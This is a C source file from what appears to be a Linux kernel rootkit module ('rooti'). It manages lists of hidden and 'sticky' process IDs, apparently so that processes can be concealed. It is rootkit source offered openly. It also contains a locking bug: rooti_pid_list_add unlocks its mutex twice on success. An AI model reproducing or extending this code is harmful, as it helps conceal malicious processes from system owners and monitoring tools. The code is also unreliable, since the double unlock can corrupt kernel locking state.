#include <linux/slab.h>
#include <linux/rcupdate.h>
#include <linux/rcutree.h>
#include "utils.h"
#include "state.h"

DEFINE_MUTEX(rooti_state_mutex);
LIST_HEAD(rooti_hidden_pids);
LIST_HEAD(rooti_sticky_pids);

int rooti_pid_list_add(pid_t pid, struct list_head *list)
{
    struct rooti_pid_list_head *entry;
    int ret = 0;

    mutex_lock(&rooti_state_mutex);

    // Nothing should be done if PID is already present
    list_for_each_entry(entry, list, list) {
        if (entry->pid == pid) {
            goto out;
        }
    }

    entry = kmalloc(sizeof(*entry), GFP_KERNEL);
    if (entry == NULL) {
        ROOTI_DEBUG("failed to allocate memory");
        ret = -ENOMEM;
        goto out;
    }

    entry->pid = pid;
    INIT_LIST_HEAD(&entry->list);
    list_add_tail_rcu(&entry->list, list);
    mutex_unlock(&rooti_state_mutex);

out:
    mutex_unlock(&rooti_state_mutex);
    return ret;
}

void rooti_pid_list_del(pid_t pid, struct list_head *list)
{
    struct rooti_pid_list_head *entry;

    mutex_lock(&rooti_state_mutex);
    list_for_each_entry(entry, list, list) {
        if (entry->pid == pid) {
            list_del_rcu(&entry->list);
            kfree_rcu(entry, rcu);
            break;
        }
    }
    mutex_unlock(&rooti_state_mutex);
}

void rooti_pid_list_clear(struct list_head *list)
{
    struct rooti_pid_list_head *entry;
    struct rooti_pid_list_head *tmp;

    mutex_lock(&rooti_state_mutex);
    list_for_each_entry_safe(entry, tmp, list, list) {
        list_del_rcu(&entry->list);
        kfree_rcu(entry, rcu);
    }
    mutex_unlock(&rooti_state_mutex);
}

bool rooti_pid_list_contains(pid_t pid, struct list_head *list)
{
    struct rooti_pid_list_head *entry;

    rcu_read_lock();
    list_for_each_entry_rcu(entry, list, list) {
        if (entry->pid == pid) {
            rcu_read_unlock();
            return true;
        }
    }
    rcu_read_unlock();

    return false;
}
